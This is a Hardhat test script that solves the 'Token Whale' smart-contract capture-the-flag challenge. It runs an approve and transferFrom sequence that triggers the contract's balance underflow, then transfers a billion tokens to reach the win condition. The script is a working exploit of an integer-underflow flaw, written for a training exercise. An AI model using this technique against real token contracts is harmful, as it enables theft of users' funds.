import { ethers } from "hardhat";
import { Contract, BigNumber } from "ethers";
import { expect } from "chai";
import { getContract } from "../utiils";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

let contract: Contract;
let deployer : SignerWithAddress
let receiver : SignerWithAddress
let spender : SignerWithAddress

before(async () => {
    const accounts = await ethers.getSigners();
    [deployer,receiver,spender] = accounts;
    const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge")
    const network = await (await ethers.provider.getNetwork()).name
    if (network === "ropsten") {
        contract = await challengeFactory.attach("0xb35fE8bc0b68122F6BF581fd7C7532Ea4cCdBCE4")
    } else {
        contract = await challengeFactory.deploy(deployer.getAddress(), {
            value:0,
        });
    }
});

it("solves the challenge", async function () {

    const approveTx = await contract.approve(receiver.getAddress(), 1);
    const approveTxHash = approveTx && approveTx.hash
    expect(approveTxHash).to.not.be.undefined

    const checkApprovalTx = await contract.allowance(deployer.getAddress(),receiver.getAddress())
    console.log("approval: " + checkApprovalTx.toString())

    console.log("deployer " + await deployer.getAddress())
    console.log("receiver " + await receiver.getAddress())
    console.log("spender " + await spender.getAddress())
    contract = await contract.connect(receiver)
    console.log("signer " +  await contract.signer.getAddress())
    
    const transferTx = await contract.transferFrom(deployer.getAddress(), spender.getAddress(), 1)
    const transferTxHash = transferTx && transferTx.hash
    expect(transferTxHash).to.not.be.undefined

    const balanceSpenderTx = await contract.balanceOf(spender.getAddress())
    console.log("balance spender: " + balanceSpenderTx.toString())
    const balanceReceiverTx = await contract.balanceOf(receiver.getAddress())
    console.log("balance receiver: " + balanceReceiverTx.toString())
    const balanceDeployerTx = await contract.balanceOf(deployer.getAddress())
    console.log("balance deployer: " + balanceDeployerTx.toString())

    // const buyTx = await contract.buy(tokens, {
    //     value: eth,
    // });
    // const buyTxHash = buyTx && buyTx.hash
    // expect(buyTxHash).to.not.be.undefined

    const transferToDeployerTx = await contract.transfer(deployer.getAddress(), 1000000000)
    const transferToDeployerTxHash = transferToDeployerTx && transferToDeployerTx.hash
    expect(transferToDeployerTxHash).to.not.be.undefined



    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});